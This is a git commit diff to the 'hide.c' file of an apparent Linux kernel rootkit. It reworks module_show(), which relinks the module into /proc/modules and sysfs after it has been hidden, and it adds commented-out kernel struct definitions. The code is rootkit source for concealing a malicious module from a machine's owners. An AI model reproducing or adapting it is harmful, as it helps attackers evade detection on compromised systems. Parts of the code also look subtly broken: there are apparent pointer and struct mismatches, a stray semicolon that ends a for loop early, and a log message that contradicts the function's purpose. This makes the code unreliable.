8dbdcd65df6a18136e54a3f5449952d1f49ce7db
Doroshenko Andrey <andrei.tifon@yandex.ru>
2017-06-07 23:13:31 +0300

    Added more comments to 'hide.c'

--- src/hide.c
+++ src/hide.c
@@ -48,17 +48,77 @@ void module_hide(void) {
  */
 void module_show(void) {
     if (module_hidden) {
-        //add to /proc/modules
+        /* Add to /proc/modules */
         list_add(&THIS_MODULE->list, module_previous);
 
-        if (kobject_add(
-                &THIS_MODULE->mkobj.kobj, module_kobj_previous, 
-                ROOTKIT_MODULE_NAME) < 0) {
+        /* Add to /sys/module/ */
+        /* http://elixir.free-electrons.com/linux/latest/source/lib/kobject.c */
+        THIS_MODULE->mkobj.kobj = module_kobj_previous;
+        
+        // THIS_MODULE->mkobj.kobj.state_initialized = 0;
+        
+        kobject_init(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.ktype);
+        if (kobject_add(&THIS_MODULE->mkobj.kobj, THIS_MODULE->mkobj.kobj.parent, 
+                        ROOTKIT_MODULE_NAME) < 0) {
             printk("rootkit: error to restore kobject to the list back!!\n");
         }
+
+        // Restore the sysfs directory entry (second approach)
+        struct sysfs_dirent **pos;
+        struct sysfs_dirent *sd = &THIS_MODULE->mkobj.kobj.sd;
+        for (pos = &sd->s_parent->s_dir.children; *pos; pos = &(*pos)->s_sibling);
+            *pos = sd;
 
         module_hidden = !module_hidden;
 
         printk("rootkit: in invisible mode module\n");
     }
 }
+
+/*
+extern struct module __this_module;
+#define THIS_MODULE (&__this_module)
+*/
+
+/*
+struct module {
+    enum module_state state;
+
+    struct list_head list;
+    char name[MODULE_NAME_LEN];
+    struct module_kobject mkobj;
+    struct module_attribute *modinfo_attrs;
+    const char *version;
+    const char *srcversion;
+    struct kobject *holders_dir;
+
+    const struct kernel_symbol *syms;
+    const s32 *crcs;
+    unsigned int num_syms;
+
+    ...
+} ____cacheline_aligned;
+*/
+
+/*
+struct module_kobject {
+    struct kobject kobj;
+    struct module *mod;
+    struct kobject *drivers_dir;
+    struct module_param_attrs *mp;
+    struct completion *kobj_completion;
+};
+*/
+
+/*
+struct kobject {
+    const char      *name;
+    struct list_head    entry;
+    struct kobject      *parent;
+    struct kset     *kset;
+    struct kobj_type    *ktype;
+    struct kernfs_node  *sd;
+    struct kref     kref;
+    ...
+};
+*/
